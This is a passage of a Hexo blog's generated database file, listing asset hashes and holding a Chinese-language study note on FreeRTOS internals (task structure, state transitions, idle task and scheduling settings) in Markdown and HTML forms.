516146578},{"_id":"public/libs/animate/animate.min.css","hash":"97afa151569f046b2e01f27c1871646e9cd87caf","modified":1601516146578},{"_id":"public/libs/aos/aos.css","hash":"191a3705a8f63e589a50a0ff2f2c5559f1a1b6b2","modified":1601516146578},{"_id":"public/libs/aplayer/APlayer.min.js","hash":"22caa28ff6b41a16ff40f15d38f1739e22359478","modified":1601516146578},{"_id":"public/libs/gitalk/gitalk.css","hash":"940ded3ea12c2fe1ab0820d2831ec405f3f1fe9f","modified":1601516146578},{"_id":"public/libs/cryptojs/crypto-js.min.js","hash":"5989527a378b55011a59522f41eeb3981518325c","modified":1601516146578},{"_id":"public/libs/gitment/gitment-default.css","hash":"2903c59ee06b965bef32e937bd69f5b0b2190717","modified":1601516146578},{"_id":"public/libs/dplayer/DPlayer.min.css","hash":"f7d19655f873b813ffba5d1a17145c91f82631b8","modified":1601516146579},{"_id":"public/libs/masonry/masonry.pkgd.min.js","hash":"ff940b4ea68368ca0e4d5560cbb79fb147dfc3c5","modified":1601516146579},{"_id":"public/libs/dplayer/DPlayer.min.js","hash":"c3bad7b265574fab0ae4d45867422ea1cb9d6599","modified":1601516146579},{"_id":"public/libs/gitment/gitment.js","hash":"28c02c45ce568e084cd1041dc493f83f9c6c88c6","modified":1601516146579},{"_id":"public/libs/valine/Valine.min.js","hash":"6cbdbf91e1f046dd41267a5ff0691a1fccba99df","modified":1601516146579},{"_id":"public/libs/jquery/jquery.min.js","hash":"2115753ca5fb7032aec498db7bb5dca624dbe6be","modified":1601516146579},{"_id":"public/libs/gitalk/gitalk.min.js","hash":"8fefe38f28804f90116bdcb74a0875c9de9f3b7d","modified":1601516146579},{"_id":"public/libs/lightGallery/css/lightgallery.min.css","hash":"1b7227237f9785c66062a4811508916518e4132c","modified":1601516146579},{"_id":"public/libs/lightGallery/js/lightgallery-all.min.js","hash":"9f5ef4bc8a0a3c746ca4f3c3e6d64493b1a977d8","modified":1601516146579},{"_id":"public/libs/materialize/materialize.min.js","hash":"c8b4c65651921d888cf5f27430dfe2ad190d35bf","modified":1601516146579},{"_id":"public/libs/materialize/materialize.min.css","hash":"a69d456e3345e7f59cd0d47d1b3e70fd4a496a05","modified":1601516146579},{"_id":"public/libs/share/js/jquery.share.min.js","hash":"41367dcb857e02e3c417ebe68a554ce1d4430806","modified":1601516146580},{"_id":"public/libs/share/js/social-share.min.js","hash":"a3090a02786dcd4efc6355c1c1dc978add8d6827","modified":1601516146580},{"_id":"public/libs/valine/av-min.js","hash":"541efb9edc1ce425cbe3897cfc25803211fe6a05","modified":1601516146580},{"_id":"public/libs/awesome/css/all.css","hash":"ecc41e32ad2696877a1656749841f3b5543bbe3d","modified":1601516146580},{"_id":"public/libs/echarts/echarts.min.js","hash":"9496f386a0da4601cad22c479cc5543913a4d67f","modified":1601516146580},{"_id":"public/medias/cover.jpg","hash":"d4957ff7cc5e88555cd840f2956ab0561e6f1ccf","modified":1601516146580},{"_id":"public/medias/banner/1.jpg","hash":"ab122a36998a4f62a61e61a4fc5e00248113413b","modified":1601516146581},{"_id":"public/medias/banner/5.jpg","hash":"852418f4f09e796e12bc3bab7a1488d3f37d6486","modified":1601516146581},{"_id":"public/medias/banner/6.jpg","hash":"ed7282cc129c4ff9f322d2f2897fb4aac5c48589","modified":1601516146581},{"_id":"public/libs/awesome/webfonts/fa-regular-400.svg","hash":"3d3a49445343d80f3b553e3e3425b9a7bd49acaf","modified":1601516146581},{"_id":"public/libs/awesome/webfonts/fa-solid-900.eot","hash":"cab8e84ae5682d1d556e234df9c790985888def8","modified":1601516146581},{"_id":"public/libs/awesome/webfonts/fa-solid-900.ttf","hash":"9521ed12274c2cbc910cea77657116fcf6545da3","modified":1601516146581},{"_id":"public/medias/banner/4.jpg","hash":"e5ac5033678afa9d69edffe9a61004f836cb5734","modified":1601516146593},{"_id":"public/libs/awesome/webfonts/fa-brands-400.svg","hash":"5e2d2a159294576bea69cc3360efb5ffe110ab2d","modified":1601516146613},{"_id":"public/libs/awesome/webfonts/fa-solid-900.svg","hash":"7da88b19e1486f8c968d3cf5ab3f194f01ea17fd","modified":1601516146640},{"_id":"public/2020/09/13/freertos_implemantion/index.html","hash":"8f978257cd8421c8151c1cb0fed1d0bea2ee8a9e","modified":1601788405650},{"_id":"public/categories/MCU/index.html","hash":"7d8876adb3363c64520d23b2f110403e43d357f8","modified":1601788405681},{"_id":"public/tags/OS/index.html","hash":"9da93174e46f994f765d5890f36c5113d13aebe0","modified":1601788405681},{"_id":"public/2020/09/13/freertos_implemantion/images/TCB.jpg","hash":"0332bcb685dee2d81c2d9f2f14c928441ea1b51b","modified":1601563165431},{"_id":"public/2020/09/13/freertos_implemantion/images/source_diretory.jpg","hash":"77325ff4b55e479b79c33de49d04eeb07128110f","modified":1601563165431},{"_id":"public/2020/09/13/freertos_implemantion/images/ready_list_structure.png","hash":"f55144ef97e8afbb0c55d796c0066df268a70754","modified":1601563165432},{"_id":"public/2020/09/13/freertos_implemantion/images/code_architecture.jpg","hash":"8ef4e0b48b5fafe4f33d704b716bccfca16c1cf6","modified":1601563165432},{"_id":"public/2020/09/13/freertos_implemantion/images/list_list_structure.jpg","hash":"0e7408bac46d4cf44b56e655ee32d87d29e4e1b4","modified":1601563165432},{"_id":"public/2020/09/13/freertos_implemantion/images/list_item_structure.jpg","hash":"3e062111826f8269cb4b0fccbc6d4c9e1cf16a0f","modified":1601563165432},{"_id":"public/2020/09/13/freertos_implemantion/images/state_transition.jpg","hash":"21ab17ed65da5025be18c69abbdba2ac4803e78a","modified":1601563165432},{"_id":"source/_posts/kinibi_introduction.md","hash":"e5c001b0812a8186c30825d45d43742cdb27467d","modified":1601788278629},{"_id":"source/_posts/kinibi_introduction/images/basic_non_secure_application.jpg","hash":"c2f56e7b9c9521366817f66e39b4faaf5f074480","modified":1601111641000},{"_id":"source/_posts/kinibi_introduction/images/invoke_command_process.jpg","hash":"f8fc80292ff7c7ca7c2da3366669ea790c31dcdb","modified":1601111543361},{"_id":"source/_posts/kinibi_introduction/images/non_call_secure.jpg","hash":"df7aeec7086d633369819265114d7040d0c14c2e","modified":1601109963000},{"_id":"source/_posts/kinibi_introduction/images/secure_interrupt_handler.jpg","hash":"c6a8df38bd5ef45f639b2afc91963370070226d3","modified":1601110780094},{"_id":"source/_posts/kinibi_introduction/images/secure_module_command_overview.jpg","hash":"4f2a41d09888a0f251e1dde11fef82ecfc474b93","modified":1600946853000},{"_id":"source/_posts/kinibi_introduction/images/secure_secure.jpg","hash":"6ed6f5937d1abedc0d34ada13f697d5fcfe9cfc9","modified":1601110103000},{"_id":"source/_posts/kinibi_introduction/images/command_handle_memory layout.jpg","hash":"2dd43fd7a9fd107d1b29efada5dfc20e51978b4f","modified":1600952748000},{"_id":"source/_posts/kinibi_introduction/images/overview.png","hash":"2da7a30fea9484f9d2606f6ea6e8239e88986c61","modified":1600934946000},{"_id":"source/_posts/kinibi_introduction/images/global_overview.jpg","hash":"1076de51a86eaf5f4e10024e526005f84f64cf76","modified":1600939022000},{"_id":"source/_posts/kinibi_introduction/images/secure_module_manifest.jpg","hash":"3e4fe0f83c0a197b16290f20ab3a495057c75c2f","modified":1600945791000},{"_id":"source/_posts/kinibi_introduction/images/manifest.jpg","hash":"356dfb7af5cc2b3f0c3b975f8ee3851ba8b87855","modified":1601118354000},{"_id":"public/2020/09/24/kinibi_introduction/index.html","hash":"2d4ed71090b4b1494e8a4a00533d3436686dc706","modified":1601788405650},{"_id":"public/2020/09/24/kinibi_introduction/images/basic_non_secure_application.jpg","hash":"c2f56e7b9c9521366817f66e39b4faaf5f074480","modified":1601788079533},{"_id":"public/2020/09/24/kinibi_introduction/images/non_call_secure.jpg","hash":"df7aeec7086d633369819265114d7040d0c14c2e","modified":1601788079533},{"_id":"public/2020/09/24/kinibi_introduction/images/secure_interrupt_handler.jpg","hash":"c6a8df38bd5ef45f639b2afc91963370070226d3","modified":1601788079534},{"_id":"public/2020/09/24/kinibi_introduction/images/invoke_command_process.jpg","hash":"f8fc80292ff7c7ca7c2da3366669ea790c31dcdb","modified":1601788079534},{"_id":"public/2020/09/24/kinibi_introduction/images/secure_module_command_overview.jpg","hash":"4f2a41d09888a0f251e1dde11fef82ecfc474b93","modified":1601788079534},{"_id":"public/2020/09/24/kinibi_introduction/images/secure_secure.jpg","hash":"6ed6f5937d1abedc0d34ada13f697d5fcfe9cfc9","modified":1601788079534},{"_id":"public/2020/09/24/kinibi_introduction/images/command_handle_memory layout.jpg","hash":"2dd43fd7a9fd107d1b29efada5dfc20e51978b4f","modified":1601788079535},{"_id":"public/2020/09/24/kinibi_introduction/images/overview.png","hash":"2da7a30fea9484f9d2606f6ea6e8239e88986c61","modified":1601788079535},{"_id":"public/2020/09/24/kinibi_introduction/images/global_overview.jpg","hash":"1076de51a86eaf5f4e10024e526005f84f64cf76","modified":1601788079537},{"_id":"public/2020/09/24/kinibi_introduction/images/secure_module_manifest.jpg","hash":"3e4fe0f83c0a197b16290f20ab3a495057c75c2f","modified":1601788079537},{"_id":"public/2020/09/24/kinibi_introduction/images/manifest.jpg","hash":"356dfb7af5cc2b3f0c3b975f8ee3851ba8b87855","modified":1601788079539},{"_id":"source/_posts/arm_mpu.md","hash":"37b8a8da828ba8c7d52ee2145c2f13dae3092de7","modified":1601788322154},{"_id":"source/_posts/arm_mpu/images/backgroud_freertos.jpg","hash":"21054b76539f32a025f8b1c9ae39661793efaa5b","modified":1601101556000},{"_id":"source/_posts/arm_mpu/images/configure_mpu.jpg","hash":"d4815aa59445e2a1efdb8f2a88ddc367542d577e","modified":1601103712000},{"_id":"source/_posts/arm_mpu/images/freertos_region_configuration.jpg","hash":"022b82f55a1fcbe70fe4c1457f3e6b3fd9c03117","modified":1601109412000},{"_id":"source/_posts/arm_mpu/images/freertos_stack.jpg","hash":"4a15cbda59cb83dcee105aed4fd21a939771cd88","modified":1601108854000},{"_id":"source/_posts/arm_mpu/images/mair_freertos.jpg","hash":"1f2587d31e15e173699e96ba21a2bbd7e4cfa304","modified":1601108755000},{"_id":"source/_posts/arm_mpu/images/mpu_ctrl_register2.jpg","hash":"5bd8dcc498fe20f999789aa567ca0146bea41215","modified":1601101661000},{"_id":"source/_posts/arm_mpu/images/mpu_rbar_register2.jpg","hash":"e9bbaf24ca6a857e047de5e6a36d27bdc8e2ee21","modified":1601102200000},{"_id":"source/_posts/arm_mpu/images/mpu_rlara_register.jpg","hash":"cbbd55a1971db3118bd27a1a3e532c6c1b5c684d","modified":1601103622000},{"_id":"source/_posts/arm_mpu/images/cortexm23_architecture.jpg","hash":"a6a60c0a2d6d809d12fb5c4a0d60f15873a3d167","modified":1601032305000},{"_id":"source/_posts/arm_mpu/images/mpu_ctrl_register1.jpg","hash":"f9a7fb59ad2617e97a5c309be34b7c86ac76e0b1","modified":1601101063000},{"_id":"source/_posts/arm_mpu/images/mpu_rbar_register1.jpg","hash":"edae14dc1186f0834ad7224d5db0e864207a24d9","modified":1601102151000},{"_id":"source/_posts/arm_mpu/images/mpu_registers.jpg","hash":"bb0ea5fcfdc3d1f319673ccf1b8301c551b3f4bd","modified":1601086304000},{"_id":"source/_posts/arm_mpu/images/mpu_rlar_register.jpg","hash":"d84cc9b079837320589e6f44d1b2d2d2dc7291ad","modified":1601102990000},{"_id":"source/_posts/arm_mpu/images/mpu_rnr_register.jpg","hash":"2113c69510646675343d92909dc135e02de61707","modified":1601101872000},{"_id":"source/_posts/arm_mpu/images/mpu_type_register.jpg","hash":"cb2d3120f94930e63a27010bdb7e4214de07481f","modified":1601101003000},{"_id":"public/2020/09/20/arm_mpu/index.html","hash":"69122da230a839bda134c00f5061f781dbb487ba","modified":1601788405685},{"_id":"public/categories/CSAPP/index.html","hash":"a2d3dbf7e50cb46ab0180e511ded1894d28a418c","modified":1601788405685},{"_id":"public/categories/Security/index.html","hash":"3e4442f1b2a1c2525bd9f775492b4e69ffb97725","modified":1601788405685},{"_id":"public/tags/peripherals/index.html","hash":"e91ced6090b9ed22cca0193a5c73d0c1959c0c98","modified":1601788405685},{"_id":"public/2020/09/20/arm_mpu/images/backgroud_freertos.jpg","hash":"21054b76539f32a025f8b1c9ae39661793efaa5b","modified":1601788405687},{"_id":"public/2020/09/20/arm_mpu/images/configure_mpu.jpg","hash":"d4815aa59445e2a1efdb8f2a88ddc367542d577e","modified":1601788405687},{"_id":"public/2020/09/20/arm_mpu/images/freertos_region_configuration.jpg","hash":"022b82f55a1fcbe70fe4c1457f3e6b3fd9c03117","modified":1601788405687},{"_id":"public/2020/09/20/arm_mpu/images/mair_freertos.jpg","hash":"1f2587d31e15e173699e96ba21a2bbd7e4cfa304","modified":1601788405687},{"_id":"public/2020/09/20/arm_mpu/images/freertos_stack.jpg","hash":"4a15cbda59cb83dcee105aed4fd21a939771cd88","modified":1601788405687},{"_id":"public/2020/09/20/arm_mpu/images/mpu_ctrl_register2.jpg","hash":"5bd8dcc498fe20f999789aa567ca0146bea41215","modified":1601788405687},{"_id":"public/2020/09/20/arm_mpu/images/mpu_rbar_register2.jpg","hash":"e9bbaf24ca6a857e047de5e6a36d27bdc8e2ee21","modified":1601788405687},{"_id":"public/2020/09/20/arm_mpu/images/mpu_rlara_register.jpg","hash":"cbbd55a1971db3118bd27a1a3e532c6c1b5c684d","modified":1601788405687},{"_id":"public/2020/09/20/arm_mpu/images/cortexm23_architecture.jpg","hash":"a6a60c0a2d6d809d12fb5c4a0d60f15873a3d167","modified":1601788405689},{"_id":"public/2020/09/20/arm_mpu/images/mpu_ctrl_register1.jpg","hash":"f9a7fb59ad2617e97a5c309be34b7c86ac76e0b1","modified":1601788405689},{"_id":"public/2020/09/20/arm_mpu/images/mpu_rbar_register1.jpg","hash":"edae14dc1186f0834ad7224d5db0e864207a24d9","modified":1601788405689},{"_id":"public/2020/09/20/arm_mpu/images/mpu_registers.jpg","hash":"bb0ea5fcfdc3d1f319673ccf1b8301c551b3f4bd","modified":1601788405689},{"_id":"public/2020/09/20/arm_mpu/images/mpu_rlar_register.jpg","hash":"d84cc9b079837320589e6f44d1b2d2d2dc7291ad","modified":1601788405689},{"_id":"public/2020/09/20/arm_mpu/images/mpu_rnr_register.jpg","hash":"2113c69510646675343d92909dc135e02de61707","modified":1601788405689},{"_id":"public/2020/09/20/arm_mpu/images/mpu_type_register.jpg","hash":"cb2d3120f94930e63a27010bdb7e4214de07481f","modified":1601788405689}],"Category":[{"name":"MCU","_id":"ckfqxctp00000x3jxtioq84a9"},{"name":"CSAPP","_id":"ckfungjfv0005uwjxkmjegbee"},{"name":"Security","_id":"ckfungjgp0008uwjxtjk15zgi"}],"Data":[],"Page":[{"title":"404","date":"2020-10-24T03:20:20.000Z","type":"404","layout":"404","description":"您好，服务发生了点小故障，正在抢救---","_content":"","source":"404.md","raw":"---\ntitle: 404\ndate: 2020-10-23 20:20:20\ntype: \"404\"\nlayout: \"404\"\ndescription: \"您好，服务发生了点小故障，正在抢救---\"\n---","updated":"2020-10-01T00:21:30.263Z","path":"404.html","comments":1,"_id":"ckfq5d2yl0000dljxgv6z2k4r","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"FreeRTOS Implementation","catalog":true,"date":"2020-09-13T07:00:00.000Z","subtitle":null,"header-img":null,"top":false,"_content":"\n# Code Architecture\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/code_architecture.jpg\" alt=\"\" />\nFreeRTOS的代码可以分为两个部分，一个是与硬件无关的代码，一般放在source目录下，是用户程序可以调用的代码。其中，最为主要的是task.c,list.c和queue.c三个文件\n<img style=\"display: block; margin: 0 auto;\" src=\"images/source_diretory.jpg\" alt=\"\" />\n\n## list.c\n定义双向链表和列表项的结构，以及操作链表的函数，列表和列表项的结构如下\n<img style=\"display: block; margin: 0 auto;\" src=\"images/list_list_structure.jpg\" alt=\"\" />\n<img style=\"display: block; margin: 0 auto;\" src=\"images/list_item_structure.jpg\" alt=\"\" />\n\n## tasks.c\ntasks.c 主要包括task的结构定义以及用户可以调用的task操作\n### TCB\n<img style=\"display: block; margin: 0 auto;\" src=\"images/TCB.jpg\"\nalt=\"\" />\n*ListItem  State*: task状态(Ready，blocked，suspended，running) \\      \n*ListItem  Event* \\\n*Priority* \\\n*pxStack* \\\n*TaskName\n\n## Queue.c\n用于进程间通信\n\n# TASK\n## task functions\n`void ATaskFunction( void *pvParameters ); `\n\n### 每个task含有单独stack\n```\nvoid ATaskFunction( void *pvParameters ) { /* Variables can be declared just as per a normal function.  Each instance of a task created using this example function will have its own copy of the lVariableExample variable.  This would not be true if the variable was declared static – in which case only one copy of the variable would exist, and this copy would be shared by each created instance of the task. (The prefixes added to variable names are described in section 1.5, Data Types and Coding Style Guide.) */ \n\nint32_t lVariableExample = 0; \n \n/* A task will normally be implemented as an infinite loop. */     \n\nfor( ;; ) {/* The code to implement the task functionality will go here. */     \n\n} \n \n/* Should the task implementation ever break out of the above loop, then the task      must be deleted before reaching the end of its implementing function.  The NULL      parameter passed to the vTaskDelete() API function indicates that the task to be      deleted is the calling (this) task.  The convention used to name API functions is      described in section 0, Projects that use a FreeRTOS version older than V9.0.0 \n\n\nvTaskDelete( NULL );\n```\n\n## 创建 task\n```\nBaseType_t xTaskCreate( TaskFunction_t pvTaskCode, const char * const pcName,    uint16_t usStackDepth,void *pvParameters,UBaseType_t uxPriority,\nTaskHandle_t *pxCreatedTask );\n```\n**pvTaskCode**      function name\\\n**pcName**          only for debug use,freertos does not use it\\\n**usStackDepth**    specify the size of stack\\\n**pvParameters**     function parameters\n\n\n## state transition\n### blocked state\n**Tasks可以通过两种类别的event事件进入blocked模式**\\\n**Temporal (time-related) events**：Task等待一段固定的延时，比如taskDelay\\\n**Synchronization events**：事件起源于其他task或者中断，比如IO等待数据\n### The Suspended State\nsuspended state 由应用程序控制（与中断无关）\n### The Ready State\n### the Running State\n![avatar](./images/state_transition.jpg)\n\n\n###  以下两个函数会将当前任务放到blocked列表中\n`vTaskDelayUntil()`   : run task at a fixed frequency\\\n` vTaskDelay(). `\n\n\n\n## idle task\n### 当scheduler启动时，会启动idle task  \n`vTaskStartScheduler()`\n###  Idle task 负责清理被删除的task\n### Idle task hook \n用户可以定义idle task的应用程序，一般用作低功耗模式\\\n***priority*** alwasy 0\n\n**configIDLE_SHOULD_YIELD** \n\n## Scheduling Algorithms \n### Round Robin Scheduling\nFixed Priority **Pre-emptive Scheduling** with Time Slicing\\\nconfigUSE_PREEMPTION =1 \\\nconfigUSE_TIME_SLICING =1 \\\n**pre-emptive:** pre-emptive the lower priority task at each end of a time slice\n\n### Co-operative Scheduling\n`configUSE_PREEMPTION =0`\\\n`configUSE_TIME_SLICING = Any Value`\n\n# scheduler\n","source":"_posts/freertos_implemantion.md","raw":"---\ntitle: FreeRTOS Implementation\ncatalog: true\ndate: 2020.9.13\nsubtitle: \nheader-img: \ntop: false\ntags: OS\ncategories: MCU \n---\n\n# Code Architecture\n\n<img style=\"display: block; margin: 0 auto;\" src=\"images/code_architecture.jpg\" alt=\"\" />\nFreeRTOS的代码可以分为两个部分，一个是与硬件无关的代码，一般放在source目录下，是用户程序可以调用的代码。其中，最为主要的是task.c,list.c和queue.c三个文件\n<img style=\"display: block; margin: 0 auto;\" src=\"images/source_diretory.jpg\" alt=\"\" />\n\n## list.c\n定义双向链表和列表项的结构，以及操作链表的函数，列表和列表项的结构如下\n<img style=\"display: block; margin: 0 auto;\" src=\"images/list_list_structure.jpg\" alt=\"\" />\n<img style=\"display: block; margin: 0 auto;\" src=\"images/list_item_structure.jpg\" alt=\"\" />\n\n## tasks.c\ntasks.c 主要包括task的结构定义以及用户可以调用的task操作\n### TCB\n<img style=\"display: block; margin: 0 auto;\" src=\"images/TCB.jpg\"\nalt=\"\" />\n*ListItem  State*: task状态(Ready，blocked，suspended，running) \\      \n*ListItem  Event* \\\n*Priority* \\\n*pxStack* \\\n*TaskName\n\n## Queue.c\n用于进程间通信\n\n# TASK\n## task functions\n`void ATaskFunction( void *pvParameters ); `\n\n### 每个task含有单独stack\n```\nvoid ATaskFunction( void *pvParameters ) { /* Variables can be declared just as per a normal function.  Each instance of a task created using this example function will have its own copy of the lVariableExample variable.  This would not be true if the variable was declared static – in which case only one copy of the variable would exist, and this copy would be shared by each created instance of the task. (The prefixes added to variable names are described in section 1.5, Data Types and Coding Style Guide.) */ \n\nint32_t lVariableExample = 0; \n \n/* A task will normally be implemented as an infinite loop. */     \n\nfor( ;; ) {/* The code to implement the task functionality will go here. */     \n\n} \n \n/* Should the task implementation ever break out of the above loop, then the task      must be deleted before reaching the end of its implementing function.  The NULL      parameter passed to the vTaskDelete() API function indicates that the task to be      deleted is the calling (this) task.  The convention used to name API functions is      described in section 0, Projects that use a FreeRTOS version older than V9.0.0 \n\n\nvTaskDelete( NULL );\n```\n\n## 创建 task\n```\nBaseType_t xTaskCreate( TaskFunction_t pvTaskCode, const char * const pcName,    uint16_t usStackDepth,void *pvParameters,UBaseType_t uxPriority,\nTaskHandle_t *pxCreatedTask );\n```\n**pvTaskCode**      function name\\\n**pcName**          only for debug use,freertos does not use it\\\n**usStackDepth**    specify the size of stack\\\n**pvParameters**     function parameters\n\n\n## state transition\n### blocked state\n**Tasks可以通过两种类别的event事件进入blocked模式**\\\n**Temporal (time-related) events**：Task等待一段固定的延时，比如taskDelay\\\n**Synchronization events**：事件起源于其他task或者中断，比如IO等待数据\n### The Suspended State\nsuspended state 由应用程序控制（与中断无关）\n### The Ready State\n### the Running State\n![avatar](./images/state_transition.jpg)\n\n\n###  以下两个函数会将当前任务放到blocked列表中\n`vTaskDelayUntil()`   : run task at a fixed frequency\\\n` vTaskDelay(). `\n\n\n\n## idle task\n### 当scheduler启动时，会启动idle task  \n`vTaskStartScheduler()`\n###  Idle task 负责清理被删除的task\n### Idle task hook \n用户可以定义idle task的应用程序，一般用作低功耗模式\\\n***priority*** alwasy 0\n\n**configIDLE_SHOULD_YIELD** \n\n## Scheduling Algorithms \n### Round Robin Scheduling\nFixed Priority **Pre-emptive Scheduling** with Time Slicing\\\nconfigUSE_PREEMPTION =1 \\\nconfigUSE_TIME_SLICING =1 \\\n**pre-emptive:** pre-emptive the lower priority task at each end of a time slice\n\n### Co-operative Scheduling\n`configUSE_PREEMPTION =0`\\\n`configUSE_TIME_SLICING = Any Value`\n\n# scheduler\n","slug":"freertos_implemantion","published":1,"updated":"2020-10-01T01:48:33.438Z","_id":"ckfq5d2zq0001dljx7zmrl1eb","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Code-Architecture\"><a href=\"#Code-Architecture\" class=\"headerlink\" title=\"Code Architecture\"></a>Code Architecture</h1><img style=\"display: block; margin: 0 auto;\" src=\"images/code_architecture.jpg\" alt>\nFreeRTOS的代码可以分为两个部分，一个是与硬件无关的代码，一般放在source目录下，是用户程序可以调用的代码。其中，最为主要的是task.c,list.c和queue.c三个文件\n<img style=\"display: block; margin: 0 auto;\" src=\"images/source_diretory.jpg\" alt>\n\n<h2 id=\"list-c\"><a href=\"#list-c\" class=\"headerlink\" title=\"list.c\"></a>list.c</h2><p>定义双向链表和列表项的结构，以及操作链表的函数，列表和列表项的结构如下<br><img style=\"display: block; margin: 0 auto;\" src=\"images/list_list_structure.jpg\" alt><br><img style=\"display: block; margin: 0 auto;\" src=\"images/list_item_structure.jpg\" alt></p>\n<h2 id=\"tasks-c\"><a href=\"#tasks-c\" class=\"headerlink\" title=\"tasks.c\"></a>tasks.c</h2><p>tasks.c 主要包括task的结构定义以及用户可以调用的task操作</p>\n<h3 id=\"TCB\"><a href=\"#TCB\" class=\"headerlink\" title=\"TCB\"></a>TCB</h3><p><img style=\"display: block; margin: 0 auto;\" src=\"images/TCB.jpg\" alt><br><em>ListItem  State</em>: task状态(Ready，blocked，suspended，running) \\<br><em>ListItem  Event</em> <br><em>Priority</em> <br><em>pxStack</em> <br>*TaskName</p>\n<h2 id=\"Queue-c\"><a href=\"#Queue-c\" class=\"headerlink\" title=\"Queue.c\"></a>Queue.c</h2><p>用于进程间通信</p>\n<h1 id=\"TASK\"><a href=\"#TASK\" class=\"headerlink\" title=\"TASK\"></a>TASK</h1><h2 id=\"task-functions\"><a href=\"#task-functions\" class=\"headerlink\" title=\"task functions\"></a>task functions</h2><p><code>void ATaskFunction( void *pvParameters );</code></p>\n<h3 id=\"每个task含有单独stack\"><a href=\"#每个task含有单独stack\" class=\"headerlink\" title=\"每个task含有单独stack\"></a>每个task含有单独stack</h3><pre><code>void ATaskFunction( void *pvParameters ) { /* Variables can be declared just as per a normal function.  Each instance of a task created using this example function will have its own copy of the lVariableExample variable.  This would not be true if the variable was declared static – in which case only one copy of the variable would exist, and this copy would be shared by each created instance of the task. (The prefixes added to variable names are described in section 1.5, Data Types and Coding Style Guide.) */ \n\nint32_t lVariableExample = 0; \n\n/* A task will normally be implemented as an infinite loop. */     \n\nfor( ;; ) {/* The code to implement the task functionality will go here. */     \n\n} \n\n/* Should the task implementation ever break out of the above loop, then the task      must be deleted before reaching the end of its implementing function.  The NULL      parameter passed to the vTaskDelete() API function indicates that the task to be      deleted is the calling (this) task.  The convention used to name API functions is      described in section 0, Projects that use a FreeRTOS version older than V9.0.0 \n\n\nvTaskDelete( NULL );</code></pre><h2 id=\"创建-task\"><a href=\"#创建-task\" class=\"headerlink\" title=\"创建 task\"></a>创建 task</h2><pre><code>BaseType_t xTaskCreate( TaskFunction_t pvTaskCode, const char * const pcName,    uint16_t usStackDepth,void *pvParameters,UBaseType_t uxPriority,\nTaskHandle_t *pxCreatedTask );</code></pre><p><strong>pvTaskCode</strong>      function name<br><strong>pcName</strong>          only for debug use,freertos does not use it<br><strong>usStackDepth</strong>    specify the size of stack<br><strong>pvParameters</strong>     function parameters</p>\n<h2 id=\"state-transition\"><a href=\"#state-transition\" class=\"headerlink\" title=\"state transition\"></a>state transition</h2><h3 id=\"blocked-state\"><a href=\"#blocked-state\" class=\"headerlink\" title=\"blocked state\"></a>blocked state</h3><p><strong>Tasks可以通过两种类别的event事件进入blocked模式</strong><br><strong>Temporal (time-related) events</strong>：Task等待一段固定的延时，比如taskDelay<br><strong>Synchronization events</strong>：事件起源于其他task或者中断，比如IO等待数据</p>\n<h3 id=\"The-Suspended-State\"><a href=\"#The-Suspended-State\" class=\"headerlink\" title=\"The Suspended State\"></a>The Suspended State</h3><p>suspended state 由应用程序控制（与中断无关）</p>\n<h3 id=\"The-Ready-State\"><a href=\"#The-Ready-State\" class=\"headerlink\" title=\"The Ready State\"></a>The Ready State</h3><h3 id=\"the-Running-State\"><a href=\"#the-Running-State\" class=\"headerlink\" title=\"the Running State\"></a>the Running State</h3><p><img src=\"./images/state_transition.jpg\" alt=\"avatar\"></p>\n<h3 id=\"以下两个函数会将当前任务放到blocked列表中\"><a href=\"#以下两个函数会将当前任务放到blocked列表中\" class=\"headerlink\" title=\"以下两个函数会将当前任务放到blocked列表中\"></a>以下两个函数会将当前任务放到blocked列表中</h3><p><code>vTaskDelayUntil()</code>   : run task at a fixed frequency<br><code>vTaskDelay().</code></p>\n<h2 id=\"idle-task\"><a href=\"#idle-task\" class=\"headerlink\" title=\"idle task\"></a>idle task</h2><h3 id=\"当scheduler启动时，会启动idle-task\"><a href=\"#当scheduler启动时，会启动idle-task\" class=\"headerlink\" title=\"当scheduler启动时，会启动idle task\"></a>当scheduler启动时，会启动idle task</h3><p><code>vTaskStartScheduler()</code></p>\n<h3 id=\"Idle-task-负责清理被删除的task\"><a href=\"#Idle-task-负责清理被删除的task\" class=\"headerlink\" title=\"Idle task 负责清理被删除的task\"></a>Idle task 负责清理被删除的task</h3><h3 id=\"Idle-task-hook\"><a href=\"#Idle-task-hook\" class=\"headerlink\" title=\"Idle task hook\"></a>Idle task hook</h3><p>用户可以定义idle task的应用程序，一般用作低功耗模式<br><strong><em>priority</em></strong> alwasy 0</p>\n<p><strong>configIDLE_SHOULD_YIELD</strong> </p>\n<h2 id=\"Scheduling-Algorithms\"><a href=\"#Scheduling-Algorithms\" class=\"headerlink\" title=\"Scheduling Algorithms\"></a>Scheduling Algorithms</h2><h3 id=\"Round-Robin-Scheduling\"><a href=\"#Round-Robin-Scheduling\" class=\"headerlink\" title=\"Round Robin Scheduling\"></a>Round Robin Scheduling</h3><p>Fixed Priority <strong>Pre-emptive Scheduling</strong> with Time Slicing<br>configUSE_PREEMPTION =1 <br>configUSE_TIME_SLICING =1 <br><strong>pre-emptive:</strong> pre-emptive the lower priority task at each end of a time slice</p>\n<h3 id=\"Co-operative-Scheduling\"><a href=\"#Co-operative-Scheduling\" class=\"headerlink\" title=\"Co-operative Scheduling\"></a>Co-operative Scheduling</h3><p><code>configUSE_PREEMPTION =0</code><br><code>configUSE_TIME_SLICING = Any Value</code></p>\n<h1 id=\"scheduler\"><a href=\"#scheduler\" class=\"headerlink\" title=\"scheduler\"></a>scheduler</h1>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Code-Architecture\"><a href=\"#Code-Architecture\" class=\"headerlink\" title=\"Code Architecture\"></a>Code Architecture</h1><img style=\"display: block; margin: 0 auto;\" src=\"images/code_architecture.jpg\" alt>\nFreeRTOS的代码可以分为两个部分，一个是与硬件无关的代码，一般放在source目录下，是用户程序可以调用的代码。其中，最为主要的是task.c,list.c和queue.c三个文件\n<img style=\"display: block; margin: 0 auto;\" src=\"images/source_diretory.jpg\" alt>\n\n<h2 id=\"list-c\"><a href=\"#list-c\" class=\"headerlink\" title=\"list.c\"></a>list.c</h2><p>定义双向链表和列表项的结构，以及操作链表的函数，列表和列表项的结构如下<br><img style=\"display: block; margin: 0 auto;\" src=\"images/list_list_structure.jpg\" alt><br><img style=\"display: block; margin: 0 auto;\" src=\"images/list_item_structure.jpg\" alt></p>\n<h2 id=\"tasks-c\"><a 